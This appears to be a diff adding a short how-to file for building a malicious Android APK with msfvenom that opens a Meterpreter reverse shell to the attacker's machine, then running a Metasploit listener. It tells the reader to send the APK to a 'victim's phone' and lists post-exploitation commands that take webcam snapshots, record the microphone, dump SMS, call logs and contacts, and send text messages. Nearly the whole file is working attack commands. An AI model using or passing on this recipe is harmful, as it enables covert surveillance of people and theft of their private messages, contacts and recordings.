@@ -1,0 +1,25 @@
+1)Type the command to create executable apk file
+   msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.29.14 LPORT=4444 R > andoidApp.apk
+2)Now load the msfconsole using:
+   sudo msfconsole
+3) use multi/handler
+4) Setting Payload,LHOST,LPORT
+  a. set payload android/meterpreter/reverse_tcp
+  //tye this in new terminal to get your ip address 
+  //ifconfig
+  b. set lhost 192.168.29.14 
+  c. set lport 4444
+5) exploit
+  Meterpreter gets opened
+  Send the apk file to the victim's phone and a reverse connection session is set up
+6) Now type this commands and notice the commands:
+  a. webcam_snap
+  b. dump_calllog
+  c. dump_sms
+  d. localtime
+  e. record_mic
+  f. send_sms -d "8769976223" -t "HELLO"
+  g. webcam_list
+  h. dump_contact
+  i. record_mic -d 10 //here 10 is the time, it can be changed
+  j. webcam_snap
